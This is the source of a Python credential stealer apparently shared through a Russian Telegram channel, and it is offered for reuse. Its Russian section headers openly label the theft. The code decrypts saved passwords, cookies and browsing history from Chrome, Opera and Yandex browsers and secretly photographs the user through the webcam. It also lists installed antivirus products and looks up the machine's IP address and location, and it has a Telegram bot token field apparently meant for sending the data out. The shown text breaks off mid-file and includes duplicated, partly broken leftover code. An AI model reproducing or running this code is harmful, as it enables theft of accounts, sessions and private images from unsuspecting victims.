################################################################################
#                              RIGHT DECISION                                  #
#                     Telegram https://t.me/Bad_Decision                       #
#      Если сливаете мой скрипт в свой канал. Хотя бы отметьте мой канал       #
################################################################################
import os
import sqlite3
import win32crypt
import shutil
import requests
import zipfile
import getpass
import win32api
import platform
import time
import cv2
import sys
import json,base64
from PIL import ImageGrab
from os.path import basename
from base64 import encodebytes
import random
import sqlite3
from shutil import copyfile
from time import sleep
from datetime import datetime, timedelta
import os
import telebot
import sys
import psutil
import GPUtil
from tabulate import tabulate
from Crypto.Cipher import AES


TOKEN = "" #Токен бота
CHAT_ID = '' # Ваш чат ID










###############################################################################
#                                CHROME                                       #
###############################################################################


try:
    def get_chrome_datetime(chromedate):

        if chromedate != 86400000000 and chromedate:
            try:
                return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
            except Exception as e:
                print(f"Error: {e}, chromedate: {chromedate}")
                return chromedate
        else:
            return ""

    def get_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

 
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

        key = key[5:]

        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_data(data, key):
        try:

            iv = data[3:15]
            data = data[15:]

            cipher = AES.new(key, AES.MODE_GCM, iv)

            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except:

                return ""

    def main():

        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Google", "Chrome", "User Data", "default", "Network", "Cookies")

        filename = 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\Cookies.db'
        if not os.path.isfile(filename):

            shutil.copyfile(db_path, filename)


        db = sqlite3.connect(filename)
        cursor = db.cursor()

        cursor.execute("""
        SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
        FROM cookies""")
 
        key = get_encryption_key()
        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
            if not value:
                decrypted_value = decrypt_data(encrypted_value, key)
            else:

                decrypted_value = value
            allcookie = f"""
            Хост: {host_key}
            Имя куки: {name}
            Значение куки (расшифрованный): {decrypted_value}
            Дата создания (UTC): {get_chrome_datetime(creation_utc)}
            Дата последнего доступа (UTC): {get_chrome_datetime(last_access_utc)}
            Дата истечение срока куки (UTC): {get_chrome_datetime(expires_utc)}
            ===============================================================
            """
            with open(os.getenv("APPDATA") + '\\chromecookie.txt', "a") as a:
                a.write(allcookie)

            cursor.execute("""
            UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
            WHERE host_key = ?
            AND name = ?""", (decrypted_value, host_key, name))


        db.commit()

        db.close()

    def main2():

        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Google", "Chrome", "User Data", "default", "Cookies")

        filename = 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\Cookies.db'
        if not os.path.isfile(filename):

            shutil.copyfile(db_path, filename)


        db = sqlite3.connect(filename)
        cursor = db.cursor()

        cursor.execute("""
        SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
        FROM cookies""")

        key = get_encryption_key()
        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
            if not value:
                decrypted_value = decrypt_data(encrypted_value, key)
            else:

                decrypted_value = value
            allcookie = f"""
            Хост: {host_key}
            Имя куки: {name}
            Значение куки (расшифрованный): {decrypted_value}
            Дата создания (UTC): {get_chrome_datetime(creation_utc)}
            Дата последнего доступа (UTC): {get_chrome_datetime(last_access_utc)}
            Дата истечение срока куки (UTC): {get_chrome_datetime(expires_utc)}
            ===============================================================
            """
            with open(os.getenv("APPDATA") + '\\chromecookie.txt', "a") as a:
                a.write(allcookie)

            cursor.execute("""
            UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
            WHERE host_key = ?
            AND name = ?""", (decrypted_value, host_key, name))


        db.commit()

        db.close()
        
except:
    print('Нету хрома')

################################################################################
#                                 OPERA                                        #
################################################################################

try:
    def get_opera_datetime(chromedate):

        if chromedate != 86400000000 and chromedate:
            try:
                return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
            except Exception as e:
                print(f"Error: {e}, chromedate: {chromedate}")
                return chromedate
        else:
            return ""

    def get_encryption_key_opera():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Roaming", "Opera Software", "Opera Stable", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

 
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

        key = key[5:]

        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_data_opera(data, key):
        try:

            iv = data[3:15]
            data = data[15:]

            cipher = AES.new(key, AES.MODE_GCM, iv)

            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except:

                return ""

    def mainOpera():

        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming",
                                "Opera Software", "Opera Stable", "Cookies")

        filename = 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\CookiesOpera.db'
        if not os.path.isfile(filename):

            shutil.copyfile(db_path, filename)


        db = sqlite3.connect(filename)
        cursor = db.cursor()

        cursor.execute("""
        SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
        FROM cookies""")
 
        key = get_encryption_key_opera()
        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
            if not value:
                decrypted_value = decrypt_data_opera(encrypted_value, key)
            else:

                decrypted_value = value
            allcookie = f"""
            Хост: {host_key}
            Имя куки: {name}
            Значение куки (расшифрованный): {decrypted_value}
            Дата создания (UTC): {get_opera_datetime(creation_utc)}
            Дата последнего доступа (UTC): {get_opera_datetime(last_access_utc)}
            Дата истечение срока куки (UTC): {get_opera_datetime(expires_utc)}
            ===============================================================
            """
            with open(os.getenv("APPDATA") + '\\operacookie.txt', "a") as a:
                a.write(allcookie)

            cursor.execute("""
            UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
            WHERE host_key = ?
            AND name = ?""", (decrypted_value, host_key, name))


        db.commit()

        db.close()
        
except:
    print('Нету Opera')




try:
    def get_opera_datetime(chromedate):

        if chromedate != 86400000000 and chromedate:
            try:
                return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
            except Exception as e:
                print(f"Error: {e}, chromedate: {chromedate}")
                return chromedate
        else:
            return ""

    def get_encryption_key_opera():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Roaming", "Opera Software", "Opera Stable", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

 
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

        key = key[5:]

        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_data_opera(data, key):
        try:

            iv = data[3:15]
            data = data[15:]

            cipher = AES.new(key, AES.MODE_GCM, iv)

            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except:

                return ""

    def mainOpera2():

        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming",
                                "Opera Software", "Opera GX Stable", "Cookies")

        filename = 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\CookiesOpera.db'
        if not os.path.isfile(filename):

            shutil.copyfile(db_path, filename)


        db = sqlite3.connect(filename)
        cursor = db.cursor()

        cursor.execute("""
        SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
        FROM cookies""")
 
        key = get_encryption_key_opera()
        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
            if not value:
                decrypted_value = decrypt_data_opera(encrypted_value, key)
            else:

                decrypted_value = value
            allcookie = f"""
            Хост: {host_key}
            Имя куки: {name}
            Значение куки (расшифрованный): {decrypted_value}
            Дата создания (UTC): {get_opera_datetime(creation_utc)}
            Дата последнего доступа (UTC): {get_opera_datetime(last_access_utc)}
            Дата истечение срока куки (UTC): {get_opera_datetime(expires_utc)}
            ===============================================================
            """
            with open(os.getenv("APPDATA") + '\\operacookie.txt', "a") as a:
                a.write(allcookie)

            cursor.execute("""
            UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
            WHERE host_key = ?
            AND name = ?""", (decrypted_value, host_key, name))


        db.commit()

        db.close()
        
except:
    print('Нету Opera')


# ################################################################################
# #                                 YANDEX                                       #
try:
    def get_yandex_datetime(chromedate):
        if chromedate != 86400000000 and chromedate:
            try:
                return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
            except Exception as e:
                print(f"Error: {e}, chromedate: {chromedate}")
                return chromedate
        else:
            return ""

    def get_encryption_key_yandex():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Yandex", "YandexBrowser", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)


        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

        key = key[5:]

        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_data_yandex(data, key):
        try:

            iv = data[3:15]
            data = data[15:]

            cipher = AES.new(key, AES.MODE_GCM, iv)

            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except:

                return ""

    def mainYandex():

        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Yandex", "YandexBrowser", "User Data", "Default", "Cookies")

        filename = 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\CookiesYandex.db'
        if not os.path.isfile(filename):

            shutil.copyfile(db_path, filename)


        db = sqlite3.connect(filename)
        cursor = db.cursor()

        cursor.execute("""
        SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
        FROM cookies""")

        key = get_encryption_key_yandex()
        for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
            if not value:
                decrypted_value = decrypt_data_yandex(encrypted_value, key)
            else:

                decrypted_value = value
            allcookie = f"""
            Хост: {host_key}
            Имя куки: {name}
            Значение куки (расшифрованный): {decrypted_value}
            Дата создания (UTC): {get_yandex_datetime(creation_utc)}
            Дата последнего доступа (UTC): {get_yandex_datetime(last_access_utc)}
            Дата истечение срока куки (UTC): {get_yandex_datetime(expires_utc)}
            ===============================================================
            """
            with open(os.getenv("APPDATA") + '\\yandexcookie.txt', "a") as a:
                a.write(allcookie)

            cursor.execute("""
            UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
            WHERE host_key = ?
            AND name = ?""", (decrypted_value, host_key, name))


        db.commit()

        db.close()
except:
    print('Нету Yandex')



















def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor
################################################################################
#                              ДАННЫЕ О КОМПЬЮТЕРЕ                             #
################################################################################

uname = platform.uname()

namepc = "\nИмя пк: " + str(uname.node)
countofcpu = psutil.cpu_count(logical=True)
allcpucount = "\nОбщее количество ядер процессора:" + str(countofcpu) 

cpufreq = psutil.cpu_freq()
cpufreqincy = "\nЧастота процессора: " + str(cpufreq.max) + 'Mhz'


svmem = psutil.virtual_memory()
allram = "\nОбщая память ОЗУ: " + str(get_size(svmem.total))
ramfree = "\nДоступно: " + str(get_size(svmem.available))
ramuseg = "\nИспользуется: " + str(get_size(svmem.used))







partitions = psutil.disk_partitions()
for partition in partitions:
    nameofdevice = "\nДиск: " + str(partition.device)
    nameofdick = "\nИмя диска: " + str(partition.mountpoint)
    typeoffilesystem = "\nТип файловой системы: " + str(partition.fstype)
    try:
        partition_usage = psutil.disk_usage(partition.mountpoint)
    except PermissionError:

        continue
    allstorage = "\nОбщая память: " + str(get_size(partition_usage.total))
    usedstorage = "\nИспользуется: " + str(get_size(partition_usage.used))
    freestorage = "\nСвободно: " + str(get_size(partition_usage.free))



try:
    gpus = GPUtil.getGPUs()
    list_gpus = []
    for gpu in gpus:

        gpu_name = "\nМодель видеокарты: " + gpu.name

        gpu_free_memory = "\nСвободно памяти в видеокарте: " + f"{gpu.memoryFree}MB"

        gpu_total_memory = "\nОбщая память видеокарты: " f"{gpu.memoryTotal}MB"

        gpu_temperature = "\nТемпература видеокарты в данный момент: " f"{gpu.temperature} °C"
except:
    print('Нету видеокарты')
################################################################################
#                              АНТИВИРУСЫ                                      #
################################################################################


Antiviruses = {
    'C:\\Program Files\\Windows Defender': 'Windows Defender',
    'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
    'C:\\Program Files\\AVG\\Antivirus': 'AVG',
    'C:\\Program Files (x86)\\Avira\\Launcher': 'Avira',
    'C:\\Program Files (x86)\\IObit\\Advanced SystemCare': 'Advanced SystemCare',
    'C:\\Program Files\\Bitdefender Antivirus Free': 'Bitdefender',
    'C:\\Program Files\\DrWeb': 'Dr.Web',
    'C:\\Program Files\\ESET\\ESET Security': 'ESET',
    'C:\\Program Files (x86)\\Kaspersky Lab': 'Kaspersky Lab',
    'C:\\Program Files (x86)\\360\\Total Security': '360 Total Security',
    'C:\\Program Files\\ESET\\ESET NOD32 Antivirus': 'ESET NOD32'
    }


Antivirus = [Antiviruses[d] for d in filter(os.path.exists, Antiviruses)]






################################################################################
#                              ФОТКАЕМ ЧЕРЕЗ ВЕБ-КАМЕРУ                        #
################################################################################

try:

    cap = cv2.VideoCapture(0)


    for i in range(30):
        cap.read()


    ret, frame = cap.read()


    cv2.imwrite(os.getenv("APPDATA") + '\\4543t353454.png', frame)   


    cap.release()
except:
    print('')



Antiviruses = json.dumps(Antivirus)
###############################################################################
#                             ВОРУЕМ ПАРОЛИ CHROME                            #
###############################################################################
try:
    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key


    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)


    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)


    def decrypt_password(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = generate_cipher(master_key, iv)
            decrypted_pass = decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()  
            return decrypted_pass
        except Exception as e:

            return "Chrome < 80"    
except:
    print('НЕту хрома')





if __name__ == '__main__':
    try:
        master_key = get_master_key()
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
        shutil.copy2(login_db, 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\Loginvault.db') 
        conn = sqlite3.connect('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\Loginvault.db')
        cursor = conn.cursor()

        
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)

            alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"

            with open(os.getenv("APPDATA") + '\\chromepasswords.txt', "a") as o:
                o.write(alldatapass)
        try:

            os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\Loginvault.db')
        except Exception as e:
            pass
    except:
        print('Нету Chrome')
    


################################################################################
#                              ВОРУЕМ ИСТОРИЮ CHROME                           #
################################################################################





def parse(url):
    try:
        parsed_url_components = url.split('//')
        sublevel_split = parsed_url_components[1].split('/', 1)
        domain = sublevel_split[0].replace("www.", "")
        return domain
    except IndexError:
        print ("URL format error!")

def analyze(results):

    prompt = raw_input("[.] Type <c> to print or <p> to plot\n[>] ")

    if prompt == "c":
        for site, count in sites_count_sorted.items():
            print (site, count)
    elif prompt == "p":
        plt.bar(range(len(results)), results.values(), align='edge')
        plt.xticks(rotation=45)
        plt.xticks(range(len(results)), results.keys())
        plt.show()
    else:
        print ("[.] Uh?")
        quit()


try:
    data_path = os.path.expanduser('~')+r"\AppData\Local\Google\Chrome\User Data\Default"
    files = os.listdir(data_path)

    history_db = os.path.join(data_path, 'history')


    shutil.copy2(history_db, 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\history.db')
    c = sqlite3.connect('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\history.db')
    cursor = c.cursor()
    select_statement = "SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url;"
    cursor.execute(select_statement)

    r = cursor.fetchall()
    datas = '\n'.join([str(item) for item in r])
    file = open(os.getenv("APPDATA") + '\\history.txt', "w+") 
    file.write(datas)
except:
    print('Нету Chrome')

def parse(url):
    try:
        parsed_url_components = url.split('//')
        sublevel_split = parsed_url_components[1].split('/', 1)
        domain = sublevel_split[0].replace("www.", "")
        return domain
    except IndexError:
        print ("URL format error!")

def analyze(results):

    prompt = raw_input("[.] Type <c> to print or <p> to plot\n[>] ")

    if prompt == "c":
        for site, count in sites_count_sorted.items():
            print (site, count)
    elif prompt == "p":
        plt.bar(range(len(results)), results.values(), align='edge')
        plt.xticks(rotation=45)
        plt.xticks(range(len(results)), results.keys())
        plt.show()
    else:
        print ("[.] Uh?")
        quit()


try:
    data_path = os.path.expanduser('~')+r"\AppData\Local\Google\Chrome\User Data\Default"
    files = os.listdir(data_path)

    history_db = os.path.join(data_path, 'history')


    shutil.copy2(history_db, 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\history.db')
    c = sqlite3.connect('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\history.db')
    cursor = c.cursor()
    select_statement = "SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url;"
    cursor.execute(select_statement)

    r = cursor.fetchall()
    datas = '\n'.join([str(item) for item in r])
    file = open(os.getenv("APPDATA") + '\\history.txt', "w+") 
    file.write(datas)
except:
    print('Нету Chrome')





################################################################################
#                                 OPERA                                        #
################################################################################
try:
    def get_master_key_opera():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key


    def decrypt_payload_opera(cipher, payload):
        return cipher.decrypt(payload)


    def generate_cipher_opera(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)


    def decrypt_password_opera(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = generate_cipher_opera(master_key, iv)
            decrypted_pass = decrypt_payload_opera(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()  
            return decrypted_pass
        except Exception as e:

            return "Opera < 80"    
except:
    print('НЕту opera')



if __name__ == '__main__':
    try:
        master_key = get_master_key_opera()
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\\Opera Software\Opera Stable\Login Data'
        shutil.copy2(login_db, 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultOPERA.db') 
        conn = sqlite3.connect('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultOPERA.db')
        cursor = conn.cursor()

        
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password_opera(encrypted_password, master_key)

            alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"

            with open(os.getenv("APPDATA") + '\\operapasswords.txt', "a") as o:
                o.write(alldatapass)
        try:
            os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultOPERA.db')
        except Exception as e:
            pass
    except:
        print('Нету Opera')



try:
    def get_master_key_opera():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera GX Stable\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key


    def decrypt_payload_opera(cipher, payload):
        return cipher.decrypt(payload)


    def generate_cipher_opera(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)


    def decrypt_password_opera(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = generate_cipher_opera(master_key, iv)
            decrypted_pass = decrypt_payload_opera(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()  
            return decrypted_pass
        except Exception as e:

            return "Opera < 80"    
except:
    print('НЕту opera')



if __name__ == '__main__':
    try:
        master_key = get_master_key_opera()
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\\Opera Software\Opera GX Stable\Login Data'
        shutil.copy2(login_db, 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultOPERA.db') 
        conn = sqlite3.connect('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultOPERA.db')
        cursor = conn.cursor()

        
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password_opera(encrypted_password, master_key)

            alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"

            with open(os.getenv("APPDATA") + '\\operapasswords.txt', "a") as o:
                o.write(alldatapass)
        try:
            os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultOPERA.db')
        except Exception as e:
            pass
    except:
        print('Нету Opera')


################################################################################
#                                 OPERA                                        #
################################################################################
try:
    def parse_opera(url):
        try:
            parsed_url_components = url.split('//')
            sublevel_split = parsed_url_components[1].split('/', 1)
            domain = sublevel_split[0].replace("www.", "")
            return domain
        except IndexError:
            print ("URL format error!")

    def analyze_opera(results):

        prompt = raw_input("[.] Type <c> to print or <p> to plot\n[>] ")

        if prompt == "c":
            for site, count in sites_count_sorted.items():
                print (site, count)
        elif prompt == "p":
            plt.bar(range(len(results)), results.values(), align='edge')
            plt.xticks(rotation=45)
            plt.xticks(range(len(results)), results.keys())
            plt.show()
        else:
            print ("[.] Uh?")
            quit()

    def pass_opera():
        try:
            data_path_opera = os.path.expanduser('~')+r"\AppData\Roaming\Opera Software\Opera Stable"
            files = os.listdir(data_path_opera)

            history_db_opera = os.path.join(data_path_opera, 'History')


            shutil.copy2(history_db_opera, 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyopera.db')
            c = sqlite3.connect('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyopera.db')
            cursor = c.cursor()
            select_statement = "SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url;"
            cursor.execute(select_statement)

            r = cursor.fetchall()
            datas = '\n'.join([str(item) for item in r])
            file = open(os.getenv("APPDATA") + '\\historyOPERA.txt', "w+") 
            file.write(datas)
        except:
            print('Нету Opera')
except:
    print()

pass_opera()



try:
    def parse_opera(url):
        try:
            parsed_url_components = url.split('//')
            sublevel_split = parsed_url_components[1].split('/', 1)
            domain = sublevel_split[0].replace("www.", "")
            return domain
        except IndexError:
            print ("URL format error!")

    def analyze_opera(results):

        prompt = raw_input("[.] Type <c> to print or <p> to plot\n[>] ")

        if prompt == "c":
            for site, count in sites_count_sorted.items():
                print (site, count)
        elif prompt == "p":
            plt.bar(range(len(results)), results.values(), align='edge')
            plt.xticks(rotation=45)
            plt.xticks(range(len(results)), results.keys())
            plt.show()
        else:
            print ("[.] Uh?")
            quit()

    def pass_opera2():
        try:
            data_path_opera = os.path.expanduser('~')+r"\AppData\Roaming\Opera Software\Opera Stable"
            files = os.listdir(data_path_opera)

            history_db_opera = os.path.join(data_path_opera, 'History')


            shutil.copy2(history_db_opera, 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyopera.db')
            c = sqlite3.connect('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyopera.db')
            cursor = c.cursor()
            select_statement = "SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url;"
            cursor.execute(select_statement)

            r = cursor.fetchall()
            datas = '\n'.join([str(item) for item in r])
            file = open(os.getenv("APPDATA") + '\\historyOPERA.txt', "w+") 
            file.write(datas)
        except:
            print('Нету Opera')
except:
    print()

pass_opera2()
################################################################################
#                                 YANDEX                                       #
################################################################################

try:
    def get_master_key_yandex():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Yandex\YandexBrowser\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key


    def decrypt_payload_yandex(cipher, payload):
        return cipher.decrypt(payload)


    def generate_cipher_yandex(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)


    def decrypt_password_yandex(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = generate_cipher_yandex(master_key, iv)
            decrypted_pass = decrypt_payload_yandex(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()  
            return decrypted_pass
        except Exception as e:

            return "Yandex < 80"    
except:
    print()




if __name__ == '__main__':

    try:
        master_key = get_master_key_yandex()
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\\Yandex\YandexBrowser\User Data\Default\Login Data'
        shutil.copy2(login_db, 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultYANDEX.db') 
        conn = sqlite3.connect('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultYANDEX.db')
        cursor = conn.cursor()

        
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password_yandex(encrypted_password, master_key)

            alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"

            with open(os.getenv("APPDATA") + '\\operapasswords.txt', "a") as o:
                o.write(alldatapass)
        try:
            os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultYANDEX.db')
        except Exception as e:
            pass
    except:
        print('')









def parse_yandex(url):
    try:
        parsed_url_components = url.split('//')
        sublevel_split = parsed_url_components[1].split('/', 1)
        domain = sublevel_split[0].replace("www.", "")
        return domain
    except IndexError:
        print ("URL format error!")

def analyze_yandex(results):

    prompt = raw_input("[.] Type <c> to print or <p> to plot\n[>] ")

    if prompt == "c":
        for site, count in sites_count_sorted.items():
            print (site, count)
    elif prompt == "p":
        plt.bar(range(len(results)), results.values(), align='edge')
        plt.xticks(rotation=45)
        plt.xticks(range(len(results)), results.keys())
        plt.show()
    else:
        print ("[.] Uh?")
        quit()

def pass_yandex():
    try:
        data_path_opera = os.path.expanduser('~')+r'\AppData\Local\\Yandex\YandexBrowser\User Data\Default'
        files = os.listdir(data_path_opera)

        history_db_yandex = os.path.join(data_path_opera, 'History')


        shutil.copy2(history_db_yandex, 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyyandex.db')
        c = sqlite3.connect('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyyandex.db')
        cursor = c.cursor()
        select_statement = "SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url;"
        cursor.execute(select_statement)

        r = cursor.fetchall()
        datas = '\n'.join([str(item) for item in r])
        file = open(os.getenv("APPDATA") + '\\historyYANDEX.txt', "w+") 
        file.write(datas)
    except:
        print('Нету Opera')

pass_yandex()










################################################################################
#                              ВОРУЕМ КУКИ                                     #
################################################################################
try:
    mainYandex()
    mainOpera2()
    mainOpera()
    main()
except:
    print('Нету куки')
try:
    main2()
except:
    print('Нету куки')


################################################################################
#                              ВСЕ ДАННЫЕ И ЛОКАЦИЯ                            #
################################################################################
headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
}
drives = str(win32api.GetLogicalDriveStrings())
drives = str(drives.split('\000')[:-1])

try:
    ip = requests.get('https://api.ipify.org').text
    urlloc = 'http://ip-api.com/json/'+ip
    location1 = requests.get(urlloc, headers=headers).text
except:
    print('')
try:
